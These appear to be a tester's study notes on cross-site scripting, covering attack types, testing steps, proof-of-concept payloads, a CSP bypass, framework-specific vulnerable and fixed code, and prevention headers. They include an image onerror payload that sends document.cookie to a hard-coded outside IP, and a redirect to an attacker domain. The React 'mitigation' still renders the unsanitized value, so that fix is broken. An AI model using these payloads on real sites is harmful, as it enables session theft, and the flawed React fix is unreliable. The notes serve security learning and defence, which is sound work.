# Cross-site scripting - XSS
> Manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application. 

### XSS proof of concept
* alert(document.domain)
* alert(document.cookie)
* print(): From version 92 onward (July 20th, 2021), cross-origin iframes are prevented from calling alert(). an alternative PoC payload recommend is print().

### What can XSS be used for?
* Carry out any action that the user is able to perform.
* Read any data that the user is able to access. 
* Capture the user's login credentials. 
* Add html and tracker to steal credentials.

## Reflected
> Where the malicious script comes from the current HTTP request. 
#### Testing manually involves the following steps: 
* Test every entry point.
> Test separately every entry point for data within the application's HTTP requests. This includes parameters or other data within the URL query string and message body, and the URL file path. It also includes HTTP headers.
* Submit random alphanumeric values.
> For each entry point, submit a unique random value and determine whether the value is reflected in the response.
* Determine the reflection context.
> For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc. 
* Test alternative payloads
> If the candidate XSS payload was modified by the application, or blocked.
## Stored
> Where the malicious script comes from the website's database.
* Locate the links between entry and exit points.
> For example, user-supplied display names could appear within an obscure audit log that is only visible to some application users. 
## DOM-based
> Where the vulnerability exists in client-side code rather than server-side code.
- [Jquery, html sicks](#in-code-search-for)

* window.addEventListener('message', function(e) {
* \<iframe src=e.url\>
* innerHTML(e)
* var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d; ACMEplayer.element.src = e.url;
Functions vulnerables:
* eval(e)

POC Example
```js
<iframe id="target" src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval"></iframe>
<script>
    var a = document.getElementById('target');
    a.addEventListener('load',() => {
            target.contentWindow.postMessage({"action":"exec","payload":"alert(document.domain)"},"*")
  })
</script>
```

portswigger search for
onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'
tip
read every <a> tag


## Blind
> Is a variant of persistent XSS vulnerabilities, this is not reflected.
To detect use: https://xsshunter.com

## Self XSS
> It cannot be triggered in normal ways
Case exploitable: If some input in profile is vulnerable but only accesible for the creator, try unlogin the user and login normally doesn't have csrf protection or oauth login method.

### How to prevent XSS attacks
1) Filter input on arrival.
2) Encode data on output.
3) Use appropriate response headers.
4) Content Security Policy.

##### Directive will only allow scripts to be loaded from the same origin as the page itself:
* *script-src 'self'*
* *script-src https://scripts.normal-website.com*
* *img-src 'self'*
* *img-src https://images.normal-website.com*
* *frame-ancestors 'self'*
* *frame-ancestors 'none'*
* *frame-ancestors 'self' https://normal-website.com https://*.robust-website.com*
* *X-Frame-Options*
* *Content-Type*
* *X-Content-Type*
* *default-src 'self'*
* *object-src 'none'* 
* *frame-src 'none'*
* *base-uri 'none'*

##### Encode data on output
```http2
< converts to: &lt;
> converts to: &gt;
< converts to: \u003c
> converts to: \u003e
```
Client-side Encode:
```js
function htmlEncode(str){
    return String(str).replace(/[^\w. ]/gi, function(c){
        return '&#'+c.charCodeAt(0)+';';
    });
}
You would then use this function as follows:
<script>document.body.innerHTML = htmlEncode(untrustedValue)</script>
Return Example:
"<script>/*{}"
"&#60;script&#62;&#47;&#42;&#123;&#125;"
```

### CSP Bypass
Normally, it's not possible to overwrite an existing script-src directive. However, Chrome recently introduced the script-src-elem directive, which allows you to control script elements, but not events. Crucially, this new directive allows you to overwrite existing script-src directives.
```http
https://example.com/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

### Angular
    
```js
import { Component } from '@angular/core';

const searchQuery: string = (new URL(location.href)).searchParams.get('query');

@Component({
  template: `
    <span>No results found for: ${searchQuery}</span>
```

The query string is displayed without any processing. Most importantly, it does not escape reserved HTML characters.

#### Mitigation
    
```js    
<span>No results found for: {{ searchQuery }}</span>
    </div>
  `,
})
export class NoSearchResultsMessageComponent {
  @Input() searchQuery: string;

  constructor() {
    this.searchQuery = new URL(location.href).searchParams.get('query');
  }
}    
```    

In this modified code, we firstly save the query value into the searchQuery component property.    
Angular evaluates all expressions in double curly braces {{ }}, converts the expression results to strings, and links them with neighboring literal strings.
    
### React
    
```js
<p dangerouslySetInnerHTML={{ __html: ticket.description}}/>
```

dangerouslySetInnerHTML  attribute, which is React’s replacement for using innerHTML in the browser DOM.
    
#### Mitigation
    
```js
import sanitizeHtml from 'sanitize-html';
const SupportTicket = ({ ticket }) => {
  const sanitizedDescription = sanitizeHtml(ticket.description);
    return (
    <p dangerouslySetInnerHTML={{ __html: ticket.description}}/>
```
    
sanitize-html library to sanitize the description.    
    
To check installed npm dependencies for vulnerabilities, developers may use the npm audit command, which scans the project for vulnerabilities and automatically installs any compatible updates to vulnerable dependencies.
    
### VUE
    
#### Vulnerable Code

```html
<p v-html="ticket.description"></p>
```
    
v-html Vue directive, which is Vue's replacement for using innerHTML in the browser DOM.

Additionally, DOM objects that may be influenced by the user (attacker) should be carefully reviewed and escaped, including (but not limited to):
    
* .InnerHTML()
* document.URL
* document.URLUnencoded
* document.location (and child properties)
* document.referrer
* window.location (and child properties)
    
#### Exploit
```html
<img src=x onerror="javascript:new Image().src='http://193.112.33.32/?cookie=' + document.cookie;">
```
    
javascript:document.location = 'www.attacker.com';

#### Vulnerable Code
    
```vue
const searchQuery = new URL(location.href).searchParams.get('query');

new Vue({
  template: `
    <div class="search-results">
      <span>No results found for: ${searchQuery}</span>
    </div>
  `,
});
```

#### Mitigation
    
```vue
new Vue({
  template: `
    <div class="search-results">
      <span>No results found for: {{ searchQuery }}</span>
    </div>
  `,
  
  data: {
    searchQuery: new URL(location.href).searchParams.get('query'),
  },
});
```

The {{ }} tag will be replaced with the value of the searchQuery property on the corresponding data object.
    
### CheatSheet
* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
* https://github.com/AngelJuanMa/Pentesting/blob/main/Payloads/XSS.txt

### In code search for:
```http2
setRequestHeader
XMLHttpRequest
$.ajax 
$.get 
$.post 
$.getJSON 
fetch( 
axios({ 
Url = "http
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

## Reference:
 
https://application.security/free/kontra-front-end-top-10
